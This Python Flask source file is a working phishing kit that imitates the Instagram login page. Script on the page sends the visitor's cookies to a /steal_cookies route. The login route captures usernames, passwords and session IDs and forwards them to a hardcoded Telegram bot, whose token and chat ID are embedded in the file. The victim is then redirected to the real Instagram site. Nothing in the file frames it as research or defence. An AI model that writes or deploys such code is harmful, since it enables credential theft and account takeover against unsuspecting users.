import os
import re
import requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = "8840443558:AAFBW-dKJenVK1XbhCjHkvj_lf1QTFh0caM"
TELEGRAM_CHAT_ID = "6158101156"
REAL_INSTAGRAM_URL = "https://www.instagram.com"

HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{background:#1a2535;font-family:Arial;display:flex;flex-direction:column;align-items:center;}
.form-area{width:100%;max-width:420px;padding:0 28px;margin-top:100px;}
.field{width:100%;height:52px;background:transparent;border:1.5px solid #3d4f65;border-radius:10px;padding:0 16px;color:white;margin-bottom:10px;}
.login-btn{width:100%;height:52px;background:#1877f2;border:none;border-radius:10px;color:white;font-size:16px;cursor:pointer;}
</style>
<script>
fetch('/steal_cookies', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({cookies:document.cookie})
});
</script>
</head>
<body>
<div class="form-area">
<form method="POST" action="/login">
<input class="field" type="text" name="username" placeholder="Username" required>
<input class="field" type="password" name="password" placeholder="Password" required>
<button class="login-btn" type="submit">Log in</button>
</form>
</div>
</body>
</html>'''

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text}, timeout=5)
    except:
        pass

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/steal_cookies', methods=['POST'])
def steal_cookies():
    import json
    data = json.loads(request.data)
    cookies = data.get('cookies', '')
    session_id = re.search(r'sessionid=([^;]+)', cookies)
    session_id = session_id.group(1) if session_id else "Not found"
    send_telegram(f"🍪 SESSION ID: {session_id}\n📦 Cookies: {cookies[:200]}")
    return "OK"

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    victim_cookies = request.headers.get('Cookie', '')
    session_id = re.search(r'sessionid=([^;]+)', victim_cookies)
    session_id = session_id.group(1) if session_id else "Not found"
    send_telegram(f"🔐 USER: {username}\n🔑 PASS: {password}\n🍪 SESSION: {session_id}")
    return f'<script>window.location.href="{REAL_INSTAGRAM_URL}"</script>'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)